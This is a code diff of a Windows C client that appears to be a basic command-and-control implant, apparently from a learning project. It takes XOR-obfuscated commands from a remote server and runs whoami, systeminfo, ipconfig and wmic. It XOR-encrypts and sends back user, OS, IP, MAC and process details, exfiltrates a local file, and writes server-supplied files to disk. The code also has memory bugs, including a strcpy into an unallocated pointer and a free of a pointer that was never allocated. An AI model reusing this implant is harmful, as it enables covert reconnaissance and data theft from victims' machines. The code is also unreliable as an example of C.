@@ -5,7 +5,7 @@
 #pragma comment(lib, "ws2_32.lib")
 #include <string.h>
 
-
+// Saves output for commands from the server
 char *get_output(int num){
     char buf[2000];
     char *str = NULL;
@@ -14,60 +14,68 @@ char *get_output(int num){
     unsigned int strlength;
     FILE *ls;
 
+    // getUser command from server
     if(num == 1) {
         if (NULL == (ls = popen("whoami", "r"))) {
             perror("popen");
             exit(EXIT_FAILURE);
         }
     }
+    // getOS command from server
     else if(num == 2){
         if(NULL == (ls = popen("systeminfo | findstr /i /c:'OS Name'", "r"))){
             perror("popen");
             exit(EXIT_FAILURE);
         }
     }
+    // getIP command from server
     else if(num == 3){
         if(NULL == (ls = popen("ipconfig | findstr /i 'ipv4'", "r"))){
             perror("popen");
             exit(EXIT_FAILURE);
         }
     }
+    // getMAC command from server
     else if(num == 4){
         if(NULL == (ls = popen("ipconfig /all | findstr /i 'Physical'", "r"))){
             perror("popen");
             exit(EXIT_FAILURE);
         }
     }
+    // getProc command from server
     else if(num == 5){
         if(NULL == (ls = popen("wmic process get Description", "r"))){
             perror("popen");
             exit(EXIT_FAILURE);
         }
     }
+    // Read one line at a time from the output and save it to a string
     while (fgets(buf, sizeof(buf), ls) != NULL) {
         strlength = strlen(buf);
-        temp = realloc(str, size + strlength);  // allocate room for the buf that gets appended
+        // Allocating room for the buffer
+        temp = realloc(str, size + strlength);
         if (temp == NULL) {
             // allocation error
         } else {
             str = temp;
         }
-        strcpy(str + size - 1, buf);     // append buffer to str
+        // Appending buffer to the output string
+        strcpy(str + size - 1, buf);
         size += strlength;
     }
-    //printf(str);
     pclose(ls);
     return(str);
 }
 
 
-
-char* decrypt(char *serv_command){
+// Performing XOR encryption and decryption
+// Key byte is 0x7A
+char* xor(char *data){
     int i;
-    for(i = 0; i < strlen(serv_command); i++){
-        serv_command[i] ^= 0x7A;
+    for(i = 0; i < strlen(data); i++){
+        data[i] ^= 0x7A;
     }
-    return serv_command;
+    return data;
 }
 
 int main(){
@@ -94,6 +102,8 @@ int main(){
     char *IP;
     char *MAC;
     char *Proc;
+    char proc_message[35];
+    char *encrpyted_file_data;
 
 
 
@@ -129,111 +139,105 @@ int main(){
 
         command_size = recv(s, command, 40, 0);
         command[command_size] = '\0';
-        //printf(command);
-        strcpy(command, decrypt(command));
+        // Decrypting the command from the server
+        strcpy(command, xor(command));
 
         // getUser command from server
         if(!strcmp(command, "getUser"))
         {
-            encrypt_username = (char *) malloc(20);
             username = (char *) malloc(20);
+            encrypt_username = (char *) malloc(20);
             command_num = 1;
-            printf("getUser command read\n");
-            strcpy(encrypt_username, get_output(command_num));
-            printf(encrypt_username);
-            printf("\n");
-            //username = base64_encode((const unsigned char*)username, strlen(username));
-
-            strcpy(username, decrypt(encrypt_username));
-            printf(username);
-            send(s, username, strlen(username), 0);
+            // Command output into username string
+            strcpy(username, get_output(command_num));
+            // Placing encrypted username into encrypt_username
+            strcpy(encrypt_username, xor(username));
+            send(s, encrypt_username, strlen(encrypt_username), 0);
             free(encrypt_username);
             free(username);
         }
         // getOS command from server
         else if(!strcmp(command, "getOS")){
-            encrypt_OS = (char *) malloc(60);
             OS = (char *) malloc(60);
-            printf("getOS command read\n");
+            encrypt_OS = (char *) malloc(60);
             command_num = 2;
-            strcpy(encrypt_OS, get_output(command_num));
-            printf(encrypt_OS);
-            printf("\n");
-            strcpy(OS, decrypt(encrypt_OS));
-            printf(OS);
-            send(s, OS, strlen(OS), 0);
+            // Command output into OS string
+            strcpy(OS, get_output(command_num));
+            // Placing encrypted OS into encrypt_OS
+            strcpy(encrypt_OS, xor(OS));
+            send(s, encrypt_OS, strlen(encrypt_OS), 0);
             free(encrypt_OS);
             free(OS);
 
         }
         // getIP command from server
         else if(!strcmp(command, "getIP")){
-            encrypt_IP = (char *) malloc(200);
-            IP = (char *) malloc(200);
-            printf("getIP command read\n");
+            IP = (char *) malloc(600);
+            encrypt_IP = (char *) malloc(600);
             command_num = 3;
-            strcpy(encrypt_IP, get_output(command_num));
-            printf(encrypt_IP);
-            printf("\n");
-            strcpy(IP, decrypt(encrypt_IP));
-            send(s, IP, strlen(IP), 0);
-            //send(s, encrypt_IP, strlen(encrypt_IP), 0);
+            // Command output into IP string
+            strcpy(IP, get_output(command_num));
+            // Placing encrypted IP information into encrypt_IP
+            strcpy(encrypt_IP, xor(IP));
+            send(s, encrypt_IP, strlen(encrypt_IP), 0);
             free(encrypt_IP);
             free(IP);
         }
         // getMAC command from server
         else if(!strcmp(command, "getMAC")){
-            encrypt_MAC = (char *) malloc(600);
             MAC = (char *) malloc(600);
-            printf("getMAC command read\n");
+            encrypt_MAC = (char *) malloc(600);
             command_num = 4;
-            strcpy(encrypt_MAC, get_output(command_num));
-            printf(encrypt_MAC);
-            printf("\n");
-           // send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
-            strcpy(MAC, decrypt(encrypt_MAC));
-            send(s, MAC, strlen(MAC), 0);
+            // Command output into MAC string
+            strcpy(MAC, get_output(command_num));
+            // Placing encrypted MAC information into encrypt_MAC
+            strcpy(encrypt_MAC, xor(MAC));
+            send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
             free(encrypt_MAC);
             free(MAC);
         }
         //getProc command from server
         else if(!strcmp(command, "getProc")){
-            encrypt_Proc = (char *) malloc(20000);
             Proc = (char *) malloc(20000);
-            printf("getProc command read\n");
+            // Process confirmation message
+            strcpy(proc_message, "Processes listed on client");
             command_num = 5;
-            strcpy(encrypt_Proc, get_output(command_num));
-            printf(encrypt_Proc);
-            printf("\n");
-            strcpy(Proc, decrypt(encrypt_Proc));
-            send(s, Proc, strlen(Proc), 0);
-            //send(s, encrypt_Proc, strlen(encrypt_Proc), 0);
+            // Command output into Proc string
+            strcpy(Proc, get_output(command_num));
+            // Listing the running processes
+            printf(Proc);
+            // Sending process confirmation message to the server
+            strcpy(proc_message, xor(proc_message));
+            send(s, proc_message, strlen(proc_message), 0);
             free(encrypt_Proc);
             free(Proc);
         }
         // download command from server
         else if(!strcmp(command, "download")){
-            printf("Download command read\n");
+            // Getting pointer to downloaded file
             file_pointer = fopen("download.txt", "rb");
-            printf("Download test text");
             fseek(file_pointer, 0, SEEK_END);
             lSize = ftell(file_pointer);
             rewind(file_pointer);
             filedata = (char *) malloc(lSize + 1);
+            // Reading the file into filedata
             fread(filedata, lSize, 1, file_pointer);
             fclose(file_pointer);
             filedata[lSize] = '\0';
-            printf(filedata);
-            send(s, filedata, strlen(filedata), 0);
-            printf("File sent\n");
+            // Encrypting file data and sending it to the server
+            strcpy(encrpyted_file_data, xor(filedata));
+            send(s, encrpyted_file_data, strlen(encrpyted_file_data), 0);
             free(filedata);
         }
         // upload command from server
         else if(!strcmp(command, "upload")){
-            printf("Upload command read\n");
+            // Receive file data from the server
             file_data_size = recv(s, filedata, 1000, 0);
             filedata[file_data_size] = '\0';
+            // Decrypting the file data
+            strcpy(filedata, xor(filedata));
             strcpy(file_name, "upload.txt");
+            // Create the file and write the file data to it
            file_pointer = fopen(file_name, "wb");
            if(file_pointer == NULL){
                perror("ERROR");
@@ -241,10 +245,13 @@ int main(){
            fwrite(filedata, strlen(filedata), 1, file_pointer);
            fclose(file_pointer);
         }
-        break;
-
+        else{
+            closesocket(s);
+            WSACleanup();
+            break;
+        }
+        memset(command, 0, strlen(command));
 
     }
-    closesocket(s);
-    WSACleanup();
+
 }
